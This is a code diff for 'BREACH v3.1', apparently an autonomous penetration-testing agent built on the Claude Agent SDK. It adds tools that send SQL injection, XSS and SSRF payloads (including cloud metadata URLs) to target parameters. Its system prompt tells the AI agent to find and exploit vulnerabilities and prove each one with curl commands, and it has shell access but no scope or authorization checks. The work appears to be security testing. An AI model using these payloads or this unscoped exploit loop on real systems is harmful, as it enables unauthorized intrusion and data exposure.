@@ -1,21 +1,20 @@
 """
-BREACH v3.0 - Claude Autonomous Agent
-======================================
+BREACH v3.1 - Claude Agent SDK Integration
+===========================================
 
-Shannon-style Claude integration using Claude as an autonomous agent.
+Uses the official Claude Agent SDK (same one powering Claude Code).
 
-Key features:
-- Multi-turn execution (not single API calls)
-- Tool use with function calling
-- Checkpoint/rollback support
-- Structured output
-- Audit logging
+This replaces raw API calls with the proper agent harness that provides:
+- Multi-turn autonomous execution
+- Built-in tools (Bash, Read, Write, WebFetch)
+- Custom security testing tools via MCP
+- Checkpointing and session management
+- Streaming responses
 """
 
 import asyncio
 import json
 import time
-import hashlib
 from dataclasses import dataclass, field
 from datetime import datetime
 from pathlib import Path
@@ -23,13 +22,27 @@ from typing import Any, Callable, Dict, List, Optional
 from enum import Enum
 
 try:
+    from claude_agent_sdk import (
+        query,
+        ClaudeAgentOptions,
+        ClaudeSDKClient,
+        AssistantMessage,
+        TextBlock,
+        ToolUseBlock,
+        ToolResultBlock,
+        tool,
+        create_sdk_mcp_server,
+    )
+    AGENT_SDK_AVAILABLE = True
+except ImportError:
+    AGENT_SDK_AVAILABLE = False
+
+# Fallback to raw anthropic if SDK not available
+try:
     import anthropic
     ANTHROPIC_AVAILABLE = True
 except ImportError:
     ANTHROPIC_AVAILABLE = False
-
-from .tools import Tool, ToolResult
-from .prompts import PromptManager
 
 
 class AgentState(str, Enum):
@@ -39,14 +52,13 @@ class AgentState(str, Enum):
     WAITING_TOOL = "waiting_tool"
     COMPLETED = "completed"
     FAILED = "failed"
-    CHECKPOINTED = "checkpointed"
 
 
 @dataclass
 class AgentTurn:
     """Single turn in agent conversation."""
     turn_number: int
-    role: str  # user, assistant, tool
+    role: str
     content: str
     tool_calls: List[Dict] = field(default_factory=list)
     tool_results: List[Dict] = field(default_factory=list)
@@ -60,214 +72,459 @@ class AgentResult:
     success: bool
     output: str
     structured_output: Dict = field(default_factory=dict)
-
-    # Execution stats
     turns_used: int = 0
     total_tokens: int = 0
     cost_usd: float = 0.0
     duration_seconds: float = 0.0
-
-    # History
     conversation: List[AgentTurn] = field(default_factory=list)
-
-    # Errors
     error: Optional[str] = None
-    error_type: Optional[str] = None
-
-    # Checkpointing
-    checkpoint_id: Optional[str] = None
-    can_resume: bool = False
+    findings: List[Dict] = field(default_factory=list)
 
 
-class ClaudeAgent:
+# =============================================================================
+# CUSTOM SECURITY TESTING TOOLS (MCP Server)
+# =============================================================================
+
+if AGENT_SDK_AVAILABLE:
+
+    @tool(
+        "http_request",
+        "Make an HTTP request to test for vulnerabilities. Returns response status, headers, and body.",
+        {"url": str, "method": str, "headers": dict, "body": str, "timeout": int}
+    )
+    async def http_request_tool(args: Dict) -> Dict:
+        """Make HTTP request for security testing."""
+        import aiohttp
+
+        url = args.get("url", "")
+        method = args.get("method", "GET").upper()
+        headers = args.get("headers", {})
+        body = args.get("body")
+        timeout = args.get("timeout", 30)
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                kwargs = {
+                    "url": url,
+                    "headers": headers,
+                    "timeout": aiohttp.ClientTimeout(total=timeout),
+                    "ssl": False,  # Allow self-signed certs
+                }
+
+                if body and method in ("POST", "PUT", "PATCH"):
+                    kwargs["data"] = body
+
+                async with session.request(method, **kwargs) as resp:
+                    response_body = await resp.text()
+
+                    return {
+                        "content": [{
+                            "type": "text",
+                            "text": json.dumps({
+                                "status": resp.status,
+                                "headers": dict(resp.headers),
+                                "body": response_body[:10000],  # Limit response size
+                                "url": str(resp.url),
+                            }, indent=2)
+                        }]
+                    }
+
+        except Exception as e:
+            return {
+                "content": [{
+                    "type": "text",
+                    "text": f"HTTP request failed: {str(e)}"
+                }]
+            }
+
+    @tool(
+        "sql_injection_test",
+        "Test a URL parameter for SQL injection vulnerabilities",
+        {"url": str, "param": str, "method": str}
+    )
+    async def sqli_test_tool(args: Dict) -> Dict:
+        """Test for SQL injection."""
+        import aiohttp
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        url = args.get("url", "")
+        param = args.get("param", "")
+        method = args.get("method", "GET").upper()
+
+        payloads = [
+            "' OR '1'='1",
+            "' OR '1'='1'--",
+            "1' AND '1'='1",
+            "1 AND 1=1",
+            "1' AND SLEEP(5)--",
+            "1; SELECT * FROM users--",
+        ]
+
+        results = []
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                # Baseline request
+                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                    baseline_status = resp.status
+                    baseline_length = len(await resp.text())
+
+                for payload in payloads:
+                    test_qs = qs.copy()
+                    test_qs[param] = [payload]
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))
+
+                    start = time.time()
+                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+                        elapsed = time.time() - start
+                        body = await resp.text()
+
+                        indicators = []
+                        if resp.status != baseline_status:
+                            indicators.append(f"Status changed: {baseline_status} -> {resp.status}")
+                        if abs(len(body) - baseline_length) > 100:
+                            indicators.append(f"Length changed: {baseline_length} -> {len(body)}")
+                        if elapsed > 4.5:
+                            indicators.append(f"Time-based: {elapsed:.1f}s delay")
+                        if any(err in body.lower() for err in ["sql", "mysql", "syntax", "query"]):
+                            indicators.append("SQL error in response")
+
+                        if indicators:
+                            results.append({
+                                "payload": payload,
+                                "indicators": indicators,
+                                "status": resp.status,
+                                "response_length": len(body),
+                                "time": elapsed,
+                            })
+
+                return {
+                    "content": [{
+                        "type": "text",
+                        "text": json.dumps({
+                            "url": url,
+                            "param": param,
+                            "baseline_status": baseline_status,
+                            "baseline_length": baseline_length,
+                            "findings": results,
+                            "vulnerable": len(results) > 0,
+                        }, indent=2)
+                    }]
+                }
+
+        except Exception as e:
+            return {
+                "content": [{
+                    "type": "text",
+                    "text": f"SQLi test failed: {str(e)}"
+                }]
+            }
+
+    @tool(
+        "xss_test",
+        "Test a URL parameter for XSS vulnerabilities",
+        {"url": str, "param": str}
+    )
+    async def xss_test_tool(args: Dict) -> Dict:
+        """Test for XSS."""
+        import aiohttp
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        import uuid
+
+        url = args.get("url", "")
+        param = args.get("param", "")
+
+        canary = f"BREACH{uuid.uuid4().hex[:8]}"
+        payloads = [
+            f"<script>alert('{canary}')</script>",
+            f"<img src=x onerror=alert('{canary}')>",
+            f"<svg onload=alert('{canary}')>",
+            f"javascript:alert('{canary}')",
+            f"'\"><script>alert('{canary}')</script>",
+        ]
+
+        results = []
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                for payload in payloads:
+                    test_qs = qs.copy()
+                    test_qs[param] = [payload]
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))
+
+                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                        body = await resp.text()
+
+                        # Check if payload is reflected
+                        reflected = payload in body or canary in body
+
+                        if reflected:
+                            results.append({
+                                "payload": payload,
+                                "reflected": True,
+                                "context": "Check if script executes in browser",
+                            })
+
+                return {
+                    "content": [{
+                        "type": "text",
+                        "text": json.dumps({
+                            "url": url,
+                            "param": param,
+                            "findings": results,
+                            "potentially_vulnerable": len(results) > 0,
+                            "note": "Reflected payloads need browser validation for confirmed XSS",
+                        }, indent=2)
+                    }]
+                }
+
+        except Exception as e:
+            return {
+                "content": [{
+                    "type": "text",
+                    "text": f"XSS test failed: {str(e)}"
+                }]
+            }
+
+    @tool(
+        "ssrf_test",
+        "Test a URL parameter for SSRF vulnerabilities",
+        {"url": str, "param": str}
+    )
+    async def ssrf_test_tool(args: Dict) -> Dict:
+        """Test for SSRF."""
+        import aiohttp
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        url = args.get("url", "")
+        param = args.get("param", "")
+
+        payloads = [
+            "http://127.0.0.1",
+            "http://localhost",
+            "http://169.254.169.254/latest/meta-data/",
+            "http://[::1]",
+            "http://127.0.0.1:22",
+            "http://127.0.0.1:3306",
+        ]
+
+        results = []
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                # Baseline
+                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                    baseline = await resp.text()
+
+                for payload in payloads:
+                    test_qs = qs.copy()
+                    test_qs[param] = [payload]
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))
+
+                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                        body = await resp.text()
+
+                        indicators = []
+                        if "127.0.0.1" in body or "localhost" in body:
+                            indicators.append("Internal address in response")
+                        if "metadata" in body.lower() or "ami-id" in body:
+                            indicators.append("AWS metadata exposed!")
+                        if body != baseline and len(body) > len(baseline) + 50:
+                            indicators.append("Response differs from baseline")
+
+                        if indicators:
+                            results.append({
+                                "payload": payload,
+                                "indicators": indicators,
+                            })
+
+                return {
+                    "content": [{
+                        "type": "text",
+                        "text": json.dumps({
+                            "url": url,
+                            "param": param,
+                            "findings": results,
+                            "vulnerable": len(results) > 0,
+                        }, indent=2)
+                    }]
+                }
+
+        except Exception as e:
+            return {
+                "content": [{
+                    "type": "text",
+                    "text": f"SSRF test failed: {str(e)}"
+                }]
+            }
+
+
+def create_security_tools_server():
+    """Create MCP server with security testing tools."""
+    if not AGENT_SDK_AVAILABLE:
+        return None
+
+    return create_sdk_mcp_server(
+        name="breach-security-tools",
+        version="3.0.0",
+        tools=[
+            http_request_tool,
+            sqli_test_tool,
+            xss_test_tool,
+            ssrf_test_tool,
+        ]
+    )
+
+
+# =============================================================================
+# BREACH AGENT (Claude Agent SDK)
+# =============================================================================
+
+class BreachAgent:
     """
-    Autonomous Claude Agent.
+    BREACH Security Agent using Claude Agent SDK.
 
-    Unlike v2.x which made single API calls, this agent:
-    - Runs multi-turn conversations (up to max_turns)
-    - Uses tools via function calling
-    - Supports checkpointing for retry
-    - Produces structured output
-
-    This mirrors Shannon's claude-executor.ts approach.
+    This is the main agent class that wraps the Claude Agent SDK
+    for autonomous security testing.
     """
-
-    # Pricing per 1M tokens (Claude 3.5 Sonnet)
-    INPUT_COST_PER_1M = 3.00
-    OUTPUT_COST_PER_1M = 15.00
 
     def __init__(
         self,
-        model: str = "claude-sonnet-4-5-20250929",
-        max_turns: int = 100,
-        max_tokens: int = 64000,
-        tools: List[Tool] = None,
         system_prompt: str = None,
-        audit_dir: Path = None,
-        on_turn: Callable[[AgentTurn], None] = None,
-        on_tool_call: Callable[[str, Dict], None] = None,
+        max_turns: int = 50,
+        working_dir: Path = None,
+        on_message: Callable[[str], None] = None,
+        on_tool_use: Callable[[str, Dict], None] = None,
     ):
-        if not ANTHROPIC_AVAILABLE:
-            raise ImportError("anthropic package required. Install: pip install anthropic")
+        if not AGENT_SDK_AVAILABLE:
+            raise ImportError(
+                "Claude Agent SDK required. Install: pip install claude-agent-sdk"
+            )
 
-        self.model = model
+        self.system_prompt = system_prompt or self._default_system_prompt()
         self.max_turns = max_turns
-        self.max_tokens = max_tokens
-        self.tools = tools or []
-        self.system_prompt = system_prompt
-        self.audit_dir = audit_dir
-        self.on_turn = on_turn
-        self.on_tool_call = on_tool_call
+        self.working_dir = working_dir or Path.cwd()
+        self.on_message = on_message
+        self.on_tool_use = on_tool_use
 
-        self._client = anthropic.Anthropic()
         self._state = AgentState.IDLE
-        self._conversation: List[Dict] = []
         self._turns: List[AgentTurn] = []
-        self._total_input_tokens = 0
-        self._total_output_tokens = 0
 
-    @property
-    def state(self) -> AgentState:
-        return self._state
+    def _default_system_prompt(self) -> str:
+        return """You are BREACH, an autonomous security testing agent.
 
-    def _build_tools_schema(self) -> List[Dict]:
-        """Build Anthropic tools schema from Tool objects."""
-        return [tool.to_anthropic_schema() for tool in self.tools]
+Your mission: Find and EXPLOIT vulnerabilities with PROOF.
+
+Rules:
+1. NO EXPLOIT = NO REPORT. Only report vulnerabilities you can prove.
+2. Use the security testing tools to verify findings.
+3. Chain vulnerabilities when possible.
+4. Provide curl commands as proof.
+5. Be thorough but efficient.
+
+Available tools:
+- http_request: Make HTTP requests to test endpoints
+- sql_injection_test: Test parameters for SQLi
+- xss_test: Test parameters for XSS reflection
+- ssrf_test: Test parameters for SSRF
+- Bash: Run shell commands
+- Read: Read files
+- WebFetch: Fetch web pages
+
+When you find a vulnerability:
+1. Verify it's exploitable
+2. Document the exact steps
+3. Provide a curl command as proof
+4. Assess the impact
+"""
 
     async def run(
         self,
         task: str,
         context: Dict = None,
-        checkpoint: str = None,
     ) -> AgentResult:
         """
-        Run the agent on a task.
+        Run the agent on a security testing task.
 
         Args:
-            task: The task description
-            context: Additional context (recon results, etc.)
-            checkpoint: Resume from checkpoint ID
+            task: The security testing task
+            context: Additional context (target info, recon results, etc.)
 
         Returns:
-            AgentResult with output and stats
+            AgentResult with findings and proof
         """
         start_time = time.time()
         self._state = AgentState.RUNNING
+        self._turns = []
 
-        # Build initial message
-        user_message = self._build_task_message(task, context)
+        # Build prompt
+        prompt = self._build_prompt(task, context)
 
-        # Initialize conversation
-        if checkpoint:
-            self._load_checkpoint(checkpoint)
-        else:
-            self._conversation = []
-            self._turns = []
+        # Create security tools MCP server
+        security_server = create_security_tools_server()
 
-        self._conversation.append({"role": "user", "content": user_message})
+        # Configure agent options
+        options = ClaudeAgentOptions(
+            system_prompt=self.system_prompt,
+            max_turns=self.max_turns,
+            cwd=str(self.working_dir),
+            allowed_tools=[
+                "Bash",
+                "Read",
+                "WebFetch",
+                "mcp__breach-security-tools__http_request",
+                "mcp__breach-security-tools__sql_injection_test",
+                "mcp__breach-security-tools__xss_test",
+                "mcp__breach-security-tools__ssrf_test",
+            ],
+            mcp_servers={"breach-security-tools": security_server} if security_server else {},
+            permission_mode="acceptEdits",
+        )
+
+        output_text = ""
+        findings = []
+        turn_count = 0
 
         try:
-            # Main agent loop
-            for turn_num in range(self.max_turns):
-                # Make API call
-                response = await self._call_claude()
+            async for message in query(prompt=prompt, options=options):
+                if isinstance(message, AssistantMessage):
+                    for block in message.content:
+                        if isinstance(block, TextBlock):
+                            output_text += block.text + "\n"
+                            if self.on_message:
+                                self.on_message(block.text)
 
-                # Track tokens
-                self._total_input_tokens += response.usage.input_tokens
-                self._total_output_tokens += response.usage.output_tokens
+                        elif isinstance(block, ToolUseBlock):
+                            turn_count += 1
+                            if self.on_tool_use:
+                                self.on_tool_use(block.name, block.input)
 
-                # Process response
-                assistant_message = response.content
+                            self._turns.append(AgentTurn(
+                                turn_number=turn_count,
+                                role="tool",
+                                content=f"Tool: {block.name}",
+                                tool_calls=[{"name": block.name, "input": block.input}],
+                            ))
 
-                # Create turn record
-                turn = AgentTurn(
-                    turn_number=turn_num,
-                    role="assistant",
-                    content=self._extract_text(assistant_message),
-                    tokens_used=response.usage.input_tokens + response.usage.output_tokens,
-                )
-
-                # Check for tool use
-                tool_calls = [block for block in assistant_message if block.type == "tool_use"]
-
-                if tool_calls:
-                    turn.tool_calls = [
-                        {"name": tc.name, "input": tc.input, "id": tc.id}
-                        for tc in tool_calls
-                    ]
-
-                    # Add assistant message to conversation
-                    self._conversation.append({
-                        "role": "assistant",
-                        "content": assistant_message
-                    })
-
-                    # Execute tools
-                    self._state = AgentState.WAITING_TOOL
-                    tool_results = await self._execute_tools(tool_calls)
-                    turn.tool_results = tool_results
-
-                    # Add tool results to conversation
-                    self._conversation.append({
-                        "role": "user",
-                        "content": tool_results
-                    })
-
-                    self._state = AgentState.RUNNING
-
-                else:
-                    # No tool use - agent is done
-                    self._conversation.append({
-                        "role": "assistant",
-                        "content": assistant_message
-                    })
-
-                self._turns.append(turn)
-
-                if self.on_turn:
-                    self.on_turn(turn)
-
-                # Check stop condition
-                if response.stop_reason == "end_turn" and not tool_calls:
-                    break
-
-                # Checkpoint periodically
-                if turn_num > 0 and turn_num % 10 == 0:
-                    self._save_checkpoint(turn_num)
-
-            # Success
             self._state = AgentState.COMPLETED
 
-            # Extract final output
-            final_output = self._extract_text(assistant_message)
-            structured = self._extract_structured_output(final_output)
+            # Extract findings from output
+            findings = self._extract_findings(output_text)
 
             return AgentResult(
                 success=True,
-                output=final_output,
-                structured_output=structured,
-                turns_used=len(self._turns),
-                total_tokens=self._total_input_tokens + self._total_output_tokens,
-                cost_usd=self._calculate_cost(),
+                output=output_text,
+                structured_output={"findings": findings},
+                turns_used=turn_count,
                 duration_seconds=time.time() - start_time,
                 conversation=self._turns,
-            )
-
-        except anthropic.APIError as e:
-            self._state = AgentState.FAILED
-            self._save_checkpoint(len(self._turns))
-
-            return AgentResult(
-                success=False,
-                output="",
-                error=str(e),
-                error_type="api_error",
-                turns_used=len(self._turns),
-                total_tokens=self._total_input_tokens + self._total_output_tokens,
-                cost_usd=self._calculate_cost(),
-                duration_seconds=time.time() - start_time,
-                can_resume=True,
-                checkpoint_id=self._checkpoint_id,
+                findings=findings,
             )
 
         except Exception as e:
@@ -275,155 +532,94 @@ class ClaudeAgent:
 
             return AgentResult(
                 success=False,
-                output="",
+                output=output_text,
                 error=str(e),
-                error_type="execution_error",
-                turns_used=len(self._turns),
+                turns_used=turn_count,
                 duration_seconds=time.time() - start_time,
+                conversation=self._turns,
             )
 
-    async def _call_claude(self) -> Any:
-        """Make API call to Claude."""
-        kwargs = {
-            "model": self.model,
-            "max_tokens": self.max_tokens,
-            "messages": self._conversation,
-        }
-
-        if self.system_prompt:
-            kwargs["system"] = self.system_prompt
-
-        if self.tools:
-            kwargs["tools"] = self._build_tools_schema()
-
-        return self._client.messages.create(**kwargs)
-
-    async def _execute_tools(self, tool_calls: List) -> List[Dict]:
-        """Execute tool calls and return results."""
-        results = []
-
-        for tc in tool_calls:
-            tool_name = tc.name
-            tool_input = tc.input
-            tool_id = tc.id
-
-            if self.on_tool_call:
-                self.on_tool_call(tool_name, tool_input)
-
-            # Find matching tool
-            tool = next((t for t in self.tools if t.name == tool_name), None)
-
-            if tool:
-                try:
-                    result = await tool.execute(tool_input)
-                    results.append({
-                        "type": "tool_result",
-                        "tool_use_id": tool_id,
-                        "content": result.output if isinstance(result, ToolResult) else str(result),
-                    })
-                except Exception as e:
-                    results.append({
-                        "type": "tool_result",
-                        "tool_use_id": tool_id,
-                        "content": f"Error executing tool: {e}",
-                        "is_error": True,
-                    })
-            else:
-                results.append({
-                    "type": "tool_result",
-                    "tool_use_id": tool_id,
-                    "content": f"Unknown tool: {tool_name}",
-                    "is_error": True,
-                })
-
-        return results
-
-    def _build_task_message(self, task: str, context: Dict = None) -> str:
-        """Build the initial task message."""
-        message = f"# Task\n\n{task}\n"
+    def _build_prompt(self, task: str, context: Dict = None) -> str:
+        """Build the task prompt."""
+        prompt = f"# Security Testing Task\n\n{task}\n"
 
         if context:
-            message += "\n# Context\n\n"
-            message += json.dumps(context, indent=2, default=str)
+            prompt += "\n# Context\n\n"
+            if "target" in context:
+                prompt += f"Target: {context['target']}\n"
+            if "endpoints" in context:
+                prompt += f"\nEndpoints to test:\n"
+                for ep in context["endpoints"][:20]:  # Limit
+                    prompt += f"- {ep}\n"
+            if "parameters" in context:
+                prompt += f"\nParameters found:\n"
+                for param in list(context["parameters"])[:30]:
+                    prompt += f"- {param}\n"
 
-        message += "\n\n# Instructions\n\n"
-        message += "1. Analyze the task and available context\n"
-        message += "2. Use the available tools to accomplish the task\n"
-        message += "3. Report your findings with evidence\n"
-        message += "4. If you cannot complete the task, explain why\n"
+        prompt += """
+# Instructions
 
-        return message
+1. Analyze the target and identify potential vulnerabilities
+2. Use the security testing tools to verify each finding
+3. Only report vulnerabilities with working exploits
+4. Provide curl commands as proof for each finding
+5. Summarize findings at the end in JSON format:
 
-    def _extract_text(self, content: Any) -> str:
-        """Extract text from message content."""
-        if isinstance(content, str):
-            return content
-        if isinstance(content, list):
-            texts = [block.text for block in content if hasattr(block, 'text')]
-            return "\n".join(texts)
-        return str(content)
+```json
+{
+  "findings": [
+    {
+      "type": "sqli|xss|ssrf|etc",
+      "endpoint": "URL",
+      "parameter": "param name",
+      "payload": "the working payload",
+      "proof": "curl command",
+      "severity": "CRITICAL|HIGH|MEDIUM|LOW"
+    }
+  ]
+}
+```
+"""
+        return prompt
 
-    def _extract_structured_output(self, text: str) -> Dict:
-        """Try to extract structured output from text."""
-        # Look for JSON blocks
+    def _extract_findings(self, output: str) -> List[Dict]:
+        """Extract structured findings from output."""
         import re
-        json_match = re.search(r'```json\s*([\s\S]*?)\s*```', text)
+
+        findings = []
+
+        # Look for JSON block
+        json_match = re.search(r'```json\s*([\s\S]*?)\s*```', output)
         if json_match:
             try:
-                return json.loads(json_match.group(1))
+                data = json.loads(json_match.group(1))
+                if "findings" in data:
+                    findings = data["findings"]
             except:
                 pass
 
-        # Look for findings
-        findings = []
-        finding_pattern = r'\*\*(\w+)\*\*.*?endpoint[:\s]+([^\n]+)'
-        for match in re.finditer(finding_pattern, text, re.IGNORECASE):
-            findings.append({
-                "type": match.group(1),
-                "endpoint": match.group(2).strip(),
-            })
+        return findings
 
-        if findings:
-            return {"findings": findings}
 
-        return {}
+# =============================================================================
+# BACKWARD COMPATIBILITY - ClaudeAgent wrapper
+# =============================================================================
 
-    def _calculate_cost(self) -> float:
-        """Calculate USD cost of execution."""
-        input_cost = (self._total_input_tokens / 1_000_000) * self.INPUT_COST_PER_1M
-        output_cost = (self._total_output_tokens / 1_000_000) * self.OUTPUT_COST_PER_1M
-        return input_cost + output_cost
+class ClaudeAgent(BreachAgent):
+    """Backward compatible alias for BreachAgent."""
+    pass
 
-    def _save_checkpoint(self, turn_num: int):
-        """Save checkpoint for resume."""
-        if not self.audit_dir:
-            return
 
-        checkpoint_dir = self.audit_dir / "checkpoints"
-        checkpoint_dir.mkdir(parents=True, exist_ok=True)
+# =============================================================================
+# EXPORTS
+# =============================================================================
 
-        self._checkpoint_id = hashlib.sha256(
-            f"{time.time()}{turn_num}".encode()
-        ).hexdigest()[:12]
-
-        checkpoint_file = checkpoint_dir / f"checkpoint_{self._checkpoint_id}.json"
-        checkpoint_file.write_text(json.dumps({
-            "conversation": self._conversation,
-            "turns": [t.__dict__ for t in self._turns],
-            "input_tokens": self._total_input_tokens,
-            "output_tokens": self._total_output_tokens,
-        }, default=str))
-
-        self._state = AgentState.CHECKPOINTED
-
-    def _load_checkpoint(self, checkpoint_id: str):
-        """Load from checkpoint."""
-        if not self.audit_dir:
-            return
-
-        checkpoint_file = self.audit_dir / "checkpoints" / f"checkpoint_{checkpoint_id}.json"
-        if checkpoint_file.exists():
-            data = json.loads(checkpoint_file.read_text())
-            self._conversation = data["conversation"]
-            self._total_input_tokens = data["input_tokens"]
-            self._total_output_tokens = data["output_tokens"]
+__all__ = [
+    "BreachAgent",
+    "ClaudeAgent",
+    "AgentResult",
+    "AgentTurn",
+    "AgentState",
+    "create_security_tools_server",
+    "AGENT_SDK_AVAILABLE",
+]
